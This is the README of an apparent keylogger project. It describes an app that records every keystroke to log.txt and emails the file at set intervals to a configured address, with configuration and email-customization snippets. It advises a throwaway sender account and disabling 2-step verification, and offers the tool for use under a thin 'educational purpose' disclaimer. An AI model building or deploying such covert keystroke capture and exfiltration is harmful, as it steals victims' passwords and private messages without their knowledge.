# KeyLoggerApp

KeyLogger App while executing records all the keyboard strokes including characters, numbers and special characters (like "#", "@") in a log.txt file. After the set time is met, the KeyLogger sends the "log.txt" to the mentioned mail. 

⚠️: DISCLAIMER: This is only meant for educational purpose. Do not use it on anyone to claim information without their permission.

### Edit this

```
sender_address = "THROWAWAY_ACCOUNT_MAILID"
sender_password = "THROWAWAY_ACCOUNT_PASSWORD"

receiver_address = "SEND_DATA_TO_MAILID"
send_every = 600 
folder = "PATH_OF_LOG_FILE/log.txt"
```

- `sender_address`, This is log.txt file will be sent to you. It is advisible to create a throwaway email account. For the script to work, you need to **turn off** [2-step verification](https://support.google.com/accounts/answer/1064203) and **turn on** '[Less secure apps](https://support.google.com/accounts/answer/6010255)'. 
- `sender_password`, This is the throwaway account's password. 
- `receiver_address`, This is where the "log.txt" file will be sent to. Alternatively, you can also send it to yourself.
- `send_every`, The KeyLogger will the send the "log.txt" file every mentioned seconds. 
- `folder`, insert the path of the "log.txt" file.

### Customization

```
subject = "Captured Data"
body = "Hello,\n\nAttached below is the KeyLogger Data. Hope you liked it!"
part.add_header('Content-Disposition', 'attachment; filename="Data.txt"')
```
You can change the subject, body and the attachment filename to whatever you desire. 

Hope you like it! ❤️
